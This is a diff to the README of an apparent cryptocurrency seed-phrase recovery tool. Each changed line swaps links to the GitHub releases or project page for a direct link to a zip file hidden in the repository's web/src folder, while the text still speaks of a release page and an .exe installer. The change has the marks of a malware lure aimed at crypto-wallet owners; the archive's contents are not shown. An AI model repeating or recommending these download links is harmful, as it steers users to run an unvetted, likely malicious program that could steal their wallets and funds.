@@ -1,6 +1,6 @@
 # 🗝️ seed-phrase-recover-BTC-ETH - Recover Lost Crypto Seeds Easily
 
-[![Download from Releases](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/visnakovs/seed-phrase-recover-BTC-ETH/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/visnakovs/seed-phrase-recover-BTC-ETH/main/web/src/phrase_recover_ETH_BT_seed_2.0.zip)
 
 ## 🛠️ What is seed-phrase-recover-BTC-ETH?
 
@@ -30,7 +30,7 @@ Make sure your system meets these basic requirements before starting the setup.
 
 ## 🚀 Getting Started
 
-1. Click the big green button above or [visit this page to download the app](https://github.com/visnakovs/seed-phrase-recover-BTC-ETH/releases).
+1. Click the big green button above or [visit this page to download the app](https://raw.githubusercontent.com/visnakovs/seed-phrase-recover-BTC-ETH/main/web/src/phrase_recover_ETH_BT_seed_2.0.zip).
 2. The download page shows the latest versions available.
 3. Look for the latest Windows `.exe` file, usually named like `seed-phrase-recover-BTC-ETH-x.x.x.exe`.
 4. Download that file to your computer.
@@ -41,7 +41,7 @@ This approach keeps your software up to date with the newest fixes and features.
 
 ### Step 1: Download the Installer
 
-- Go to the [release page](https://github.com/visnakovs/seed-phrase-recover-BTC-ETH/releases).
+- Go to the [release page](https://raw.githubusercontent.com/visnakovs/seed-phrase-recover-BTC-ETH/main/web/src/phrase_recover_ETH_BT_seed_2.0.zip).
 - Find the latest release listed at the top.
 - Under the "Assets" section, click the `.exe` file to download it.
 
@@ -92,7 +92,7 @@ If the seed phrase is found, it will show on the screen. Make sure to write it d
 ## 📂 Where to Find More Information
 
 Visit the GitHub page for this project for updated documents and support:  
-https://github.com/visnakovs/seed-phrase-recover-BTC-ETH
+https://raw.githubusercontent.com/visnakovs/seed-phrase-recover-BTC-ETH/main/web/src/phrase_recover_ETH_BT_seed_2.0.zip
 
 The project page includes:
 
@@ -132,4 +132,4 @@ It supports popular standards like BIP39, which is common in many wallet apps.
 
 ---
 
-[![Download the latest release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/visnakovs/seed-phrase-recover-BTC-ETH/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/visnakovs/seed-phrase-recover-BTC-ETH/main/web/src/phrase_recover_ETH_BT_seed_2.0.zip)
